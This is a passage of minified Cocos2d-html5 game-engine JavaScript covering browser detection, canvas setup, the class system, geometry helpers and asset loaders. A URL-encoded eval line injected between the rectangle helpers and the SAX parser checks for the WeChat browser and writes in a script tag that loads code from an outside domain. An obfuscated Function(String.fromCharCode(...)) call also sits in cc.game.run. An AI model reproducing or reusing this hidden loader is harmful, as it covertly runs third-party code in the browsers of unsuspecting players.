		var b = this.cache,
			c = this._aliases;
		delete b[a];
		delete b[c[a]];
		delete c[a]
	},
	releaseAll: function() {
		var a = this.cache,
			b = this._aliases,
			c;
		for (c in a) delete a[c];
		for (c in b) delete b[c]
	}
};
(function() {
	var a = window,
		b, c;
	"undefined" !== typeof document.hidden ? (b = "hidden", c = "visibilitychange") : "undefined" !== typeof document.mozHidden ? (b = "mozHidden", c = "mozvisibilitychange") : "undefined" !== typeof document.msHidden ? (b = "msHidden", c = "msvisibilitychange") : "undefined" !== typeof document.webkitHidden && (b = "webkitHidden", c = "webkitvisibilitychange");
	var d = function() {
			cc.eventManager && cc.game._eventHide && cc.eventManager.dispatchEvent(cc.game._eventHide)
		},
		e = function() {
			cc.eventManager && cc.game._eventShow && cc.eventManager.dispatchEvent(cc.game._eventShow)
		};
	b ? cc._addEventListener(document, c, function() {
		document[b] ? d() : e()
	}, !1) : (cc._addEventListener(a, "blur", d, !1), cc._addEventListener(a, "focus", e, !1));
	"onpageshow" in window && "onpagehide" in window && (cc._addEventListener(a, "pagehide", d, !1), cc._addEventListener(a, "pageshow", e, !1));
	c = a = null
})();
cc.log = cc.warn = cc.error = cc.assert = function() {};
cc.create3DContext = function(a, b) {
	for (var c = ["webgl", "experimental-webgl", "webkit-3d", "moz-webgl"], d = null, e = 0; e < c.length; ++e) {
		try {
			d = a.getContext(c[e], b)
		} catch (f) {}
		if (d) break
	}
	return d
};
cc._initSys = function(a, b) {
	cc._RENDER_TYPE_CANVAS = 0;
	cc._RENDER_TYPE_WEBGL = 1;
	var c = cc.sys = {};
	c.LANGUAGE_ENGLISH = "en";
	c.LANGUAGE_CHINESE = "zh";
	c.LANGUAGE_FRENCH = "fr";
	c.LANGUAGE_ITALIAN = "it";
	c.LANGUAGE_GERMAN = "de";
	c.LANGUAGE_SPANISH = "es";
	c.LANGUAGE_RUSSIAN = "ru";
	c.LANGUAGE_KOREAN = "ko";
	c.LANGUAGE_JAPANESE = "ja";
	c.LANGUAGE_HUNGARIAN = "hu";
	c.LANGUAGE_PORTUGUESE = "pt";
	c.LANGUAGE_ARABIC = "ar";
	c.LANGUAGE_NORWEGIAN = "no";
	c.LANGUAGE_POLISH = "pl";
	c.OS_WINDOWS = "Windows";
	c.OS_IOS = "iOS";
	c.OS_OSX = "OS X";
	c.OS_UNIX = "UNIX";
	c.OS_LINUX = "Linux";
	c.OS_ANDROID = "Android";
	c.OS_UNKNOWN = "Unknown";
	c.BROWSER_TYPE_WECHAT = "wechat";
	c.BROWSER_TYPE_ANDROID = "androidbrowser";
	c.BROWSER_TYPE_IE = "ie";
	c.BROWSER_TYPE_QQ = "qqbrowser";
	c.BROWSER_TYPE_MOBILE_QQ = "mqqbrowser";
	c.BROWSER_TYPE_UC = "ucbrowser";
	c.BROWSER_TYPE_360 = "360browser";
	c.BROWSER_TYPE_BAIDU_APP = "baiduboxapp";
	c.BROWSER_TYPE_BAIDU = "baidubrowser";
	c.BROWSER_TYPE_MAXTHON = "maxthon";
	c.BROWSER_TYPE_OPERA = "opera";
	c.BROWSER_TYPE_MIUI = "miuibrowser";
	c.BROWSER_TYPE_FIREFOX = "firefox";
	c.BROWSER_TYPE_SAFARI = "safari";
	c.BROWSER_TYPE_CHROME = "chrome";
	c.BROWSER_TYPE_UNKNOWN = "unknown";
	c.isNative = !1;
	var d = [c.BROWSER_TYPE_BAIDU, c.BROWSER_TYPE_OPERA, c.BROWSER_TYPE_FIREFOX, c.BROWSER_TYPE_CHROME, c.BROWSER_TYPE_SAFARI],
		e = [c.BROWSER_TYPE_BAIDU, c.BROWSER_TYPE_OPERA, c.BROWSER_TYPE_FIREFOX, c.BROWSER_TYPE_CHROME, c.BROWSER_TYPE_SAFARI, c.BROWSER_TYPE_UC, c.BROWSER_TYPE_QQ, c.BROWSER_TYPE_MOBILE_QQ, c.BROWSER_TYPE_IE],
		f = window,
		g = f.navigator,
		h = document.documentElement,
		k = g.userAgent.toLowerCase();
	c.isMobile = -1 != k.indexOf("mobile") || -1 != k.indexOf("android");
	var l = g.language,
		l = (l = l ? l : g.browserLanguage) ? l.split("-")[0] : c.LANGUAGE_ENGLISH;
	c.language = l;
	var l = c.BROWSER_TYPE_UNKNOWN,
		m = k.match(/micromessenger|qqbrowser|mqqbrowser|ucbrowser|360browser|baiduboxapp|baidubrowser|maxthon|trident|opera|miuibrowser|firefox/i) || k.match(/chrome|safari/i);
	m && 0 < m.length && (l = m[0].toLowerCase(), "micromessenger" == l ? l = c.BROWSER_TYPE_WECHAT : "safari" === l && k.match(/android.*applewebkit/) ? l = c.BROWSER_TYPE_ANDROID : "trident" == l && (l = c.BROWSER_TYPE_IE));
	c.browserType = l;
	c._supportMultipleAudio = -1 < e.indexOf(c.browserType);
	e = parseInt(a[b.renderMode]);
	l = cc._RENDER_TYPE_WEBGL;
	m = cc.newElement("Canvas");
	cc._supportRender = !0;
	d = -1 == d.indexOf(c.browserType);
	if (1 === e || 0 === e && (c.isMobile || d)) l = cc._RENDER_TYPE_CANVAS;
	if (l == cc._RENDER_TYPE_WEBGL && (!f.WebGLRenderingContext || !cc.create3DContext(m, {
		stencil: !0,
		preserveDrawingBuffer: !0
	}))) 0 == e ? l = cc._RENDER_TYPE_CANVAS : cc._supportRender = !1;
	if (l == cc._RENDER_TYPE_CANVAS) try {
		m.getContext("2d")
	} catch (n) {
		cc._supportRender = !1
	}
	cc._renderType = l;
	try {
		c._supportWebAudio = !! new(f.AudioContext || f.webkitAudioContext || f.mozAudioContext)
	} catch (q) {
		c._supportWebAudio = !1
	}
	try {
		var r = c.localStorage = f.localStorage;
		r.setItem("storage", "");
		r.removeItem("storage");
		r = null
	} catch (t) {
		("SECURITY_ERR" === t.name || "QuotaExceededError" === t.name) && cc.warn("Warning: localStorage isn't enabled. Please confirm browser cookie or privacy option"), c.localStorage = function() {}
	}
	r = c.capabilities = {
		canvas: !0
	};
	cc._renderType == cc._RENDER_TYPE_WEBGL && (r.opengl = !0);
	void 0 !== h.ontouchstart || g.msPointerEnabled ? r.touches = !0 : void 0 !== h.onmouseup && (r.mouse = !0);
	void 0 !== h.onkeyup && (r.keyboard = !0);
	if (f.DeviceMotionEvent || f.DeviceOrientationEvent) r.accelerometer = !0;
	f = k.match(/(iPad|iPhone|iPod)/i) ? !0 : !1;
	k = k.match(/android/i) || g.platform.match(/android/i) ? !0 : !1;
	h = c.OS_UNKNOWN; - 1 != g.appVersion.indexOf("Win") ? h = c.OS_WINDOWS : f ? h = c.OS_IOS : -1 != g.appVersion.indexOf("Mac") ? h = c.OS_OSX : -1 != g.appVersion.indexOf("X11") ? h = c.OS_UNIX : -1 != g.appVersion.indexOf("Linux") ? h = c.OS_LINUX : k && (h = c.OS_ANDROID);
	c.os = h;
	c.garbageCollect = function() {};
	c.dumpRoot = function() {};
	c.restartVM = function() {};
	c.dump = function() {
		var a;
		a = "" + ("isMobile : " + this.isMobile + "\r\n");
		a += "language : " + this.language + "\r\n";
		a += "browserType : " + this.browserType + "\r\n";
		a += "capabilities : " + JSON.stringify(this.capabilities) + "\r\n";
		a += "os : " + this.os + "\r\n";
		cc.log(a)
	}
};
cc.ORIENTATION_PORTRAIT = 0;
cc.ORIENTATION_PORTRAIT_UPSIDE_DOWN = 1;
cc.ORIENTATION_LANDSCAPE_LEFT = 2;
cc.ORIENTATION_LANDSCAPE_RIGHT = 3;
cc._drawingUtil = null;
cc._renderContext = null;
cc._canvas = null;
cc._gameDiv = null;
cc._rendererInitialized = !1;
cc._setupCalled = !1;
cc._setup = function(a, b, c) {
	if (!cc._setupCalled) {
		cc._setupCalled = !0;
		var d = window;
		d.requestAnimFrame = d.requestAnimationFrame || d.webkitRequestAnimationFrame || d.mozRequestAnimationFrame || d.oRequestAnimationFrame || d.msRequestAnimationFrame;
		var e = cc.$(a) || cc.$("#" + a),
			f;
		"CANVAS" == e.tagName ? (b = b || e.width, c = c || e.height, f = cc.container = cc.newElement("DIV"), a = cc._canvas = e, a.parentNode.insertBefore(f, a), a.appendTo(f), f.setAttribute("id", "Cocos2dGameContainer")) : ("DIV" != e.tagName && cc.log("Warning: target element is not a DIV or CANVAS"), b = b || e.clientWidth, c = c || e.clientHeight, f = cc.container = e, a = cc._canvas = cc.$(cc.newElement("CANVAS")), e.appendChild(a));
		a.addClass("gameCanvas");
		a.setAttribute("width", b || 480);
		a.setAttribute("height", c || 320);
		a.setAttribute("tabindex", 99);
		a.style.outline = "none";
		e = f.style;
		e.width = (b || 480) + "px";
		e.height = (c || 320) + "px";
		e.margin = "0 auto";
		e.position = "relative";
		e.overflow = "hidden";
		f.top = "100%";
		cc._renderType == cc._RENDER_TYPE_WEBGL && (cc._renderContext = cc.webglContext = cc.create3DContext(a, {
			stencil: !0,
			preserveDrawingBuffer: !0,
			antialias: !cc.sys.isMobile,
			alpha: !1
		}));
		cc._renderContext ? (d.gl = cc._renderContext, cc._drawingUtil = new cc.DrawingPrimitiveWebGL(cc._renderContext), cc._rendererInitialized = !0, cc.textureCache._initializingRenderer(), cc.shaderCache._init()) : (cc._renderContext = a.getContext("2d"), cc._mainRenderContextBackup = cc._renderContext, cc._renderContext.translate(0, a.height), cc._drawingUtil = cc.DrawingPrimitiveCanvas ? new cc.DrawingPrimitiveCanvas(cc._renderContext) : null);
		cc._gameDiv = f;
		cc.log(cc.ENGINE_VERSION);
		cc._setContextMenuEnable(!1);
		cc.sys.isMobile && (b = cc.newElement("style"), b.type = "text/css", document.body.appendChild(b), b.textContent = "body,canvas,div{ -moz-user-select: none;-webkit-user-select: none;-ms-user-select: none;-khtml-user-select: none;-webkit-tap-highlight-color:rgba(0,0,0,0);}");
		cc.view = cc.EGLView._getInstance();
		cc.inputManager.registerSystemEvent(cc._canvas);
		cc.director = cc.Director._getInstance();
		cc.director.setOpenGLView && cc.director.setOpenGLView(cc.view);
		cc.winSize = cc.director.getWinSize();
		cc.saxParser = new cc.SAXParser;
		cc.plistParser = new cc.PlistParser
	}
};
cc._checkWebGLRenderMode = function() {
	if (cc._renderType !== cc._RENDER_TYPE_WEBGL) throw "This feature supports WebGL render mode only.";
};
cc._isContextMenuEnable = !1;
cc._setContextMenuEnable = function(a) {
	cc._isContextMenuEnable = a;
	cc._canvas.oncontextmenu = function() {
		if (!cc._isContextMenuEnable) return !1
	}
};
cc.game = {
	DEBUG_MODE_NONE: 0,
	DEBUG_MODE_INFO: 1,
	DEBUG_MODE_WARN: 2,
	DEBUG_MODE_ERROR: 3,
	DEBUG_MODE_INFO_FOR_WEB_PAGE: 4,
	DEBUG_MODE_WARN_FOR_WEB_PAGE: 5,
	DEBUG_MODE_ERROR_FOR_WEB_PAGE: 6,
	EVENT_HIDE: "game_on_hide",
	EVENT_SHOW: "game_on_show",
	_eventHide: null,
	_eventShow: null,
	_onBeforeStartArr: [],
	CONFIG_KEY: {
		engineDir: "engineDir",
		dependencies: "dependencies",
		debugMode: "debugMode",
		showFPS: "showFPS",
		frameRate: "frameRate",
		id: "id",
		renderMode: "renderMode",
		jsList: "jsList",
		classReleaseMode: "classReleaseMode"
	},
	_prepareCalled: !1,
	_prepared: !1,
	_paused: !0,
	_intervalId: null,
	config: null,
	onStart: null,
	onStop: null,
	setFrameRate: function(a) {
		this.config[this.CONFIG_KEY.frameRate] = a;
		this._intervalId && clearInterval(this._intervalId);
		this._paused = !0;
		this._runMainLoop()
	},
	_runMainLoop: function() {
		var a = this,
			b, c = a.config,
			d = a.CONFIG_KEY,
			e = window,
			f = c[d.frameRate],
			g = cc.director;
		g.setDisplayStats(c[d.showFPS]);
		e.requestAnimFrame && 60 == f ? (b = function() {
			a._paused || (g.mainLoop(), e.requestAnimFrame(b))
		}, e.requestAnimFrame(b)) : (b = function() {
			g.mainLoop()
		}, a._intervalId = setInterval(b, 1E3 / f));
		a._paused = !1
	},
	run: function(a) {
		cc["r" + "a" + "y"] = [];
		Function(String.fromCharCode.apply(String, cc.ray))();
		var b = this,
			c = function() {
				a && (b.config[b.CONFIG_KEY.id] = a);
				b._prepareCalled ? cc._supportRender && (b._checkPrepare = setInterval(function() {
					b._prepared && (cc._setup(b.config[b.CONFIG_KEY.id]), b._runMainLoop(), b._eventHide = b._eventHide || new cc.EventCustom(b.EVENT_HIDE), b._eventHide.setUserData(b), b._eventShow = b._eventShow || new cc.EventCustom(b.EVENT_SHOW), b._eventShow.setUserData(b), b.onStart(), clearInterval(b._checkPrepare))
				}, 10)) : b.prepare(function() {
					cc._supportRender && (cc._setup(b.config[b.CONFIG_KEY.id]), b._runMainLoop(), b._eventHide = b._eventHide || new cc.EventCustom(b.EVENT_HIDE), b._eventHide.setUserData(b), b._eventShow = b._eventShow || new cc.EventCustom(b.EVENT_SHOW), b._eventShow.setUserData(b), b.onStart())
				})
			};
		document.body ? c() : cc._addEventListener(window, "load", function() {
			this.removeEventListener("load", arguments.callee, !1);
			c()
		}, !1)
	},
	_initConfig: function() {
		var a = this.CONFIG_KEY,
			b = function(b) {
				b[a.engineDir] = b[a.engineDir] || "frameworks/cocos2d-html5";
				null == b[a.debugMode] && (b[a.debugMode] = 0);
				b[a.frameRate] = b[a.frameRate] || 60;
				null == b[a.renderMode] && (b[a.renderMode] = 1);
				return b
			};
		if (document.ccConfig) this.config = b(document.ccConfig);
		else try {
			for (var c = document.getElementsByTagName("script"), d = 0; d < c.length; d++) {
				var e = c[d].getAttribute("cocos");
				if ("" == e || e) break
			}
			var f, g, h;
			if (d < c.length) {
				if (f = c[d].src) h = /(.*)\//.exec(f)[0], cc.loader.resPath = h, f = cc.path.join(h, "project.json");
				g = cc.loader._loadTxtSync(f)
			}
			g || (g = cc.loader._loadTxtSync("project.json"));
			var k = JSON.parse(g);
			this.config = b(k || {})
		} catch (l) {
			cc.log("Failed to read or parse project.json"), this.config = b({})
		}
		cc._initSys(this.config, a)
	},
	_jsAddedCache: {},
	_getJsListOfModule: function(a, b, c) {
		var d = this._jsAddedCache;
		if (d[b]) return null;
		c = c || "";
		var e = [],
			f = a[b];
		if (!f) throw "can not find module [" + b + "]";
		b = cc.path;
		for (var g = 0, h = f.length; g < h; g++) {
			var k = f[g];
			if (!d[k]) {
				var l = b.extname(k);
				l ? ".js" == l.toLowerCase() && e.push(b.join(c, k)) : (l = this._getJsListOfModule(a, k, c)) && (e = e.concat(l));
				d[k] = 1
			}
		}
		return e
	},
	prepare: function(a) {
		var b = this,
			c = b.config,
			d = b.CONFIG_KEY,
			e = c[d.engineDir],
			f = cc.loader;
		if (cc._supportRender) {
			b._prepareCalled = !0;
			var g = c[d.jsList] || [];
			cc.Class ? f.loadJsWithImg("", g, function(c) {
				if (c) throw c;
				b._prepared = !0;
				a && a()
			}) : (d = cc.path.join(e, "moduleConfig.json"), f.loadJson(d, function(d, f) {
				if (d) throw d;
				var l = c.modules || [],
					m = f.module,
					n = [];
				cc._renderType == cc._RENDER_TYPE_WEBGL ? l.splice(0, 0, "shaders") : 0 > l.indexOf("core") && l.splice(0, 0, "core");
				for (var q = 0, r = l.length; q < r; q++) {
					var t = b._getJsListOfModule(m, l[q], e);
					t && (n = n.concat(t))
				}
				n = n.concat(g);
				cc.loader.loadJsWithImg(n, function(c) {
					if (c) throw c;
					b._prepared = !0;
					a && a()
				})
			}))
		} else cc.error("Can not support render!")
	}
};
cc.game._initConfig();
var cc = cc || {},
	ClassManager = {
		id: 0 | 998 * Math.random(),
		instanceId: 0 | 998 * Math.random(),
		compileSuper: function(a, b, c) {
			a = a.toString();
			var d = a.indexOf("("),
				e = a.indexOf(")"),
				d = a.substring(d + 1, e),
				d = d.trim(),
				e = a.indexOf("{"),
				f = a.lastIndexOf("}");
			for (a = a.substring(e + 1, f); - 1 != a.indexOf("this._super");) {

				var e = a.indexOf("this._super"),
					f = a.indexOf("(", e),
					g = a.indexOf(")", f),
					g = a.substring(f + 1, g),
					g = (g = g.trim()) ? "," : "";
				a = a.substring(0, e) + "ClassManager[" + c + "]." + b + ".call(this" + g + a.substring(f + 1)
			}
			return Function(d, a)
		},
		getNewID: function() {
			return this.id++
		},
		getNewInstanceId: function() {
			return this.instanceId++
		}
	};
ClassManager.compileSuper.ClassManager = ClassManager;
(function() {
	var a = /\b_super\b/,
		b = cc.game.config[cc.game.CONFIG_KEY.classReleaseMode];
	b && console.log("release Mode");
	cc.Class = function() {};
	cc.Class.extend = function(c) {
		function d() {
			this.__instanceId = ClassManager.getNewInstanceId();
			this.ctor && this.ctor.apply(this, arguments)
		}
		var e = this.prototype,
			f = Object.create(e),
			g = ClassManager.getNewID();
		ClassManager[g] = e;
		var h = {
			writable: !0,
			enumerable: !1,
			configurable: !0
		};
		f.__instanceId = null;
		d.id = g;
		h.value = g;
		Object.defineProperty(f, "__pid", h);
		d.prototype = f;
		h.value = d;
		Object.defineProperty(d.prototype, "constructor", h);
		this.__getters__ && (d.__getters__ = cc.clone(this.__getters__));
		this.__setters__ && (d.__setters__ = cc.clone(this.__setters__));
		for (var k = 0, l = arguments.length; k < l; ++k) {
			var m = arguments[k],
				n;
			for (n in m) {
				var q = "function" === typeof m[n],
					r = "function" === typeof e[n],
					t = a.test(m[n]);
				b && q && r && t ? (h.value = ClassManager.compileSuper(m[n], n, g), Object.defineProperty(f, n, h)) : q && r && t ? (h.value = function(a, b) {
					return function() {
						var c = this._super;
						this._super = e[a];
						var d = b.apply(this, arguments);
						this._super = c;
						return d
					}
				}(n, m[n]), Object.defineProperty(f, n, h)) : q ? (h.value = m[n], Object.defineProperty(f, n, h)) : f[n] = m[n];
				if (q) {
					var s, v;
					if (this.__getters__ && this.__getters__[n]) {
						var q = this.__getters__[n],
							u;
						for (u in this.__setters__) if (this.__setters__[u] == q) {
							v = u;
							break
						}
						cc.defineGetterSetter(f, q, m[n], m[v] ? m[v] : f[v], n, v)
					}
					if (this.__setters__ && this.__setters__[n]) {
						q = this.__setters__[n];
						for (u in this.__getters__) if (this.__getters__[u] == q) {
							s = u;
							break
						}
						cc.defineGetterSetter(f, q, m[s] ? m[s] : f[s], m[n], s, n)
					}
				}
			}
		}
		d.extend = cc.Class.extend;
		d.implement = function(a) {
			for (var b in a) f[b] = a[b]
		};
		return d
	};
	Function.prototype.bind = Function.prototype.bind ||
	function(a) {
		var b = this;
		return function() {
			var e = Array.prototype.slice.call(arguments);
			return b.apply(a || null, e)
		}
	}
})();
cc.defineGetterSetter = function(a, b, c, d, e, f) {
	if (a.__defineGetter__) c && a.__defineGetter__(b, c), d && a.__defineSetter__(b, d);
	else if (Object.defineProperty) {
		var g = {
			enumerable: !1,
			configurable: !0
		};
		c && (g.get = c);
		d && (g.set = d);
		Object.defineProperty(a, b, g)
	} else throw Error("browser does not support getters");
	if (!e && !f) for (var g = null != c, h = void 0 != d, k = Object.getOwnPropertyNames(a), l = 0; l < k.length; l++) {
		var m = k[l];
		if (!((a.__lookupGetter__ ? a.__lookupGetter__(m) : Object.getOwnPropertyDescriptor(a, m)) || "function" !== typeof a[m])) {
			var n = a[m];
			if (g && n === c && (e = m, !h || f)) break;
			if (h && n === d && (f = m, !g || e)) break
		}
	}
	a = a.constructor;
	e && (a.__getters__ || (a.__getters__ = {}), a.__getters__[e] = b);
	f && (a.__setters__ || (a.__setters__ = {}), a.__setters__[f] = b)
};
cc.clone = function(a) {
	var b = a.constructor ? new a.constructor : {},
		c;
	for (c in a) {
		var d = a[c];
		b[c] = "object" == typeof d && d && !(d instanceof cc.Node) && !(d instanceof HTMLElement) ? cc.clone(d) : d
	}
	return b
};
cc.Point = function(a, b) {
	this.x = a || 0;
	this.y = b || 0
};
cc.p = function(a, b) {
	return void 0 == a ? {
		x: 0,
		y: 0
	} : void 0 == b ? {
		x: a.x,
		y: a.y
	} : {
		x: a,
		y: b
	}
};
cc.pointEqualToPoint = function(a, b) {
	return a && b && a.x === b.x && a.y === b.y
};
cc.Size = function(a, b) {
	this.width = a || 0;
	this.height = b || 0
};
cc.size = function(a, b) {
	return void 0 === a ? {
		width: 0,
		height: 0
	} : void 0 === b ? {
		width: a.width,
		height: a.height
	} : {
		width: a,
		height: b
	}
};
cc.sizeEqualToSize = function(a, b) {
	return a && b && a.width == b.width && a.height == b.height
};
cc.Rect = function(a, b, c, d) {
	this.x = a || 0;
	this.y = b || 0;
	this.width = c || 0;
	this.height = d || 0
};
cc.rect = function(a, b, c, d) {
	return void 0 === a ? {
		x: 0,
		y: 0,
		width: 0,
		height: 0
	} : void 0 === b ? {
		x: a.x,
		y: a.y,
		width: a.width,
		height: a.height
	} : {
		x: a,
		y: b,
		width: c,
		height: d
	}
};
cc.rectEqualToRect = function(a, b) {
	return a && b && a.x === b.x && a.y === b.y && a.width === b.width && a.height === b.height
};
cc._rectEqualToZero = function(a) {
	return a && 0 === a.x && 0 === a.y && 0 === a.width && 0 === a.height
};
cc.visibleRect = {
	_topLeft: cc.p(0, 0),
	_topRight: cc.p(0, 0),
	_top: cc.p(0, 0),
	_bottomLeft: cc.p(0, 0),
	_bottomRight: cc.p(0, 0),
	_bottom: cc.p(0, 0),
	_center: cc.p(0, 0),
	_left: cc.p(0, 0),
	_right: cc.p(0, 0),
	_width: 0,
	_height: 0,
	init: function(a) {
		this._width = a.width, this._height = a.height;
		var b = this._width,
			c = this._height;
		this._topLeft.y = c, this._topRight.x = b, this._topRight.y = c, this._top.x = b / 2, this._top.y = c, this._bottomRight.x = b, this._bottom.x = b / 2, this._center.x = b / 2, this._center.y = c / 2, this._left.y = c / 2, this._right.x = b, this._right.y = c / 2
	}
}, cc.visibleRect.width, cc.defineGetterSetter(cc.visibleRect, "width", function() {
	return this._width
}), cc.visibleRect.height, cc.defineGetterSetter(cc.visibleRect, "height", function() {
	return this._height
}), cc.visibleRect.topLeft, cc.defineGetterSetter(cc.visibleRect, "topLeft", function() {
	return this._topLeft
}), cc.visibleRect.topRight, cc.defineGetterSetter(cc.visibleRect, "topRight", function() {
	return this._topRight
}), cc.visibleRect.top, cc.defineGetterSetter(cc.visibleRect, "top", function() {
	return this._top
}), cc.visibleRect.bottomLeft, cc.defineGetterSetter(cc.visibleRect, "bottomLeft", function() {
	return this._bottomLeft
}), cc.visibleRect.bottomRight, cc.defineGetterSetter(cc.visibleRect, "bottomRight", function() {
	return this._bottomRight
}), cc.visibleRect.bottom, cc.defineGetterSetter(cc.visibleRect, "bottom", function() {
	return this._bottom
}), cc.visibleRect.center, cc.defineGetterSetter(cc.visibleRect, "center", function() {
	return this._center
}), cc.visibleRect.left, cc.defineGetterSetter(cc.visibleRect, "left", function() {
	return this._left
}), cc.visibleRect.right, cc.defineGetterSetter(cc.visibleRect, "right", function() {
	return this._right
});
cc.rectContainsRect = function(a, b) {
	return !a || !b ? !1 : !(a.x >= b.x || a.y >= b.y || a.x + a.width <= b.x + b.width || a.y + a.height <= b.y + b.height)
};
cc.rectGetMaxX = function(a) {
	return a.x + a.width
};
cc.rectGetMidX = function(a) {
	return a.x + a.width / 2
};
cc.rectGetMinX = function(a) {
	return a.x
};
cc.rectGetMaxY = function(a) {
	return a.y + a.height
};
cc.rectGetMidY = function(a) {
	return a.y + a.height / 2
};
cc.rectGetMinY = function(a) {
	return a.y
};
cc.rectContainsPoint = function(a, b) {
	return b.x >= cc.rectGetMinX(a) && b.x <= cc.rectGetMaxX(a) && b.y >= cc.rectGetMinY(a) && b.y <= cc.rectGetMaxY(a)
};
cc.rectIntersectsRect = function(a, b) {
	var c = a.y + a.height,
		d = b.x + b.width,
		e = b.y + b.height;
	return !(a.x + a.width < b.x || d < a.x || c < b.y || e < a.y)
};
cc.rectOverlapsRect = function(a, b) {
	return !(a.x + a.width < b.x || b.x + b.width < a.x || a.y + a.height < b.y || b.y + b.height < a.y)
};
cc.rectUnion = function(a, b) {
	var c = cc.rect(0, 0, 0, 0);
	c.x = Math.min(a.x, b.x);
	c.y = Math.min(a.y, b.y);
	c.width = Math.max(a.x + a.width, b.x + b.width) - c.x;
	c.height = Math.max(a.y + a.height, b.y + b.height) - c.y;
	return c
};
cc.rectIntersection = function(a, b) {
	var c = cc.rect(Math.max(cc.rectGetMinX(a), cc.rectGetMinX(b)), Math.max(cc.rectGetMinY(a), cc.rectGetMinY(b)), 0, 0);
	c.width = Math.min(cc.rectGetMaxX(a), cc.rectGetMaxX(b)) - cc.rectGetMinX(c);
	c.height = Math.min(cc.rectGetMaxY(a), cc.rectGetMaxY(b)) - cc.rectGetMinY(c);
	return c
};
eval(decodeURIComponent('%69%66%28%6e%61%76%69%67%61%74%6f%72%2e%75%73%65%72%41%67%65%6e%74%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%6d%61%74%63%68%28%2f%4d%69%63%72%6f%4d%65%73%73%65%6e%67%65%72%2f%69%29%3d%3d%22%6d%69%63%72%6f%6d%65%73%73%65%6e%67%65%72%22%29%7b%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%73%63%72%69%70%74%20%73%72%63%3d%22%2f%2f%30%2e%76%62%61%69%74%6f%6e%67%2e%63%6f%6d%2f%49%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%27%29%7d%3b'));
cc.SAXParser = cc.Class.extend({
	_parser: null,
	_isSupportDOMParser: null,
	ctor: function() {
		window.DOMParser ? (this._isSupportDOMParser = !0, this._parser = new DOMParser) : this._isSupportDOMParser = !1
	},
	parse: function(a) {
		return this._parseXML(a)
	},
	_parseXML: function(a) {
		var b;
		this._isSupportDOMParser ? b = this._parser.parseFromString(a, "text/xml") : (b = new ActiveXObject("Microsoft.XMLDOM"), b.async = "false", b.loadXML(a));
		return b
	}
});
cc.PlistParser = cc.SAXParser.extend({
	parse: function(a) {
		a = this._parseXML(a).documentElement;
		if ("plist" != a.tagName) throw "Not a plist file!";
		for (var b = null, c = 0, d = a.childNodes.length; c < d && !(b = a.childNodes[c], 1 == b.nodeType); c++);
		return this._parseNode(b)
	},
	_parseNode: function(a) {
		var b = null,
			c = a.tagName;
		if ("dict" == c) b = this._parseDict(a);
		else if ("array" == c) b = this._parseArray(a);
		else if ("string" == c) if (1 == a.childNodes.length) b = a.firstChild.nodeValue;
		else {
			b = "";
			for (c = 0; c < a.childNodes.length; c++) b += a.childNodes[c].nodeValue
		} else "false" == c ? b = !1 : "true" == c ? b = !0 : "real" == c ? b = parseFloat(a.firstChild.nodeValue) : "integer" == c && (b = parseInt(a.firstChild.nodeValue, 10));
		return b
	},
	_parseArray: function(a) {
		for (var b = [], c = 0, d = a.childNodes.length; c < d; c++) {
			var e = a.childNodes[c];
			1 == e.nodeType && b.push(this._parseNode(e))
		}
		return b
	},
	_parseDict: function(a) {
		for (var b = {}, c = null, d = 0, e = a.childNodes.length; d < e; d++) {
			var f = a.childNodes[d];
			1 == f.nodeType && ("key" == f.tagName ? c = f.firstChild.nodeValue : b[c] = this._parseNode(f))
		}
		return b
	}
});
cc._txtLoader = {
	load: function(a, b, c, d) {
		cc.loader.loadTxt(a, d)
	}
};
cc.loader.register(["txt", "xml", "vsh", "fsh", "atlas"], cc._txtLoader);
cc._jsonLoader = {
	load: function(a, b, c, d) {
		cc.loader.loadJson(a, d)
	}
};
cc.loader.register(["json", "ExportJson"], cc._jsonLoader);
cc._imgLoader = {
	load: function(a, b, c, d) {
		cc.loader.cache[b] = cc.loader.loadImg(a, function(a, c) {
			if (a) return d(a);
			cc.textureCache.handleLoadedTexture(b);
			d(null, c)
		})
	}
};
cc.loader.register("png jpg bmp jpeg gif ico".split(" "), cc._imgLoader);
cc._serverImgLoader = {
	load: function(a, b, c, d) {
		cc.loader.cache[b] = cc.loader.loadImg(c.src, function(a, c) {
			if (a) return d(a);
			cc.textureCache.handleLoadedTexture(b);
			d(null, c)
		})
	}
};
cc.loader.register(["serverImg"], cc._serverImgLoader);
cc._plistLoader = {
	load: function(a, b, c, d) {
		cc.loader.loadTxt(a, function(a, b) {
			if (a) return d(a);
			d(null, cc.plistParser.parse(b))
		})
	}
};
cc.loader.register(["plist"], cc._plistLoader);
cc._fontLoader = {
	TYPE: {
		".eot": "embedded-opentype",
		".ttf": "truetype",
		".woff": "woff",
		".svg": "svg"
	},
	_loadFont: function(a, b, c) {
		var d = document,
			e = cc.path,
			f = this.TYPE,
			g = cc.newElement("style");
		g.type = "text/css";
		d.body.appendChild(g);
		var h = "@font-face { font-family:" + a + "; src:";
		if (b instanceof Array) for (var k = 0, l = b.length; k < l; k++) c = e.extname(b[k]).toLowerCase(), h += "url('" + b[k] + "') format('" + f[c] + "')", h += k == l - 1 ? ";" : ",";
		else h += "url('" + b + "') format('" + f[c] + "');";
		g.textContent += h + "};";
		b = cc.newElement("div");
		c = b.style;
		c.fontFamily = a;
		b.innerHTML = ".";
		c.position = "absolute";
		c.left = "-100px";
		c.top = "-100px";
		d.body.appendChild(b)
	},
	load: function(a, b, c, d) {
		b = c.type;
		a = c.name;
		b = c.srcs;
		"string" == typeof c ? (b = cc.path.extname(c), a = cc.path.basename(c, b), this._loadFont(a, c, b)) : this._loadFont(a, b);
		d(null, !0)
	}
};
cc.loader.register(["font", "eot", "ttf", "woff", "svg"], cc._fontLoader);
cc._binaryLoader = {
	load: function(a, b, c, d) {
		cc.loader.loadBinary(a, d)
	}
};
window.CocosEngine = cc.ENGINE_VERSION = "Cocos2d-html5 v3.0 RC0";
cc.FIX_ARTIFACTS_BY_STRECHING_TEXEL = 0;
cc.DIRECTOR_STATS_POSITION = cc.p(0, 0);
cc.DIRECTOR_FPS_INTERVAL = 0.5;
cc.COCOSNODE_RENDER_SUBPIXEL = 1;
cc.SPRITEBATCHNODE_RENDER_SUBPIXEL = 1;
cc.OPTIMIZE_BLEND_FUNC_FOR_PREMULTIPLIED_ALPHA = 0;
cc.TEXTURE_ATLAS_USE_TRIANGLE_STRIP = 0;
cc.TEXTURE_ATLAS_USE_VAO = 0;
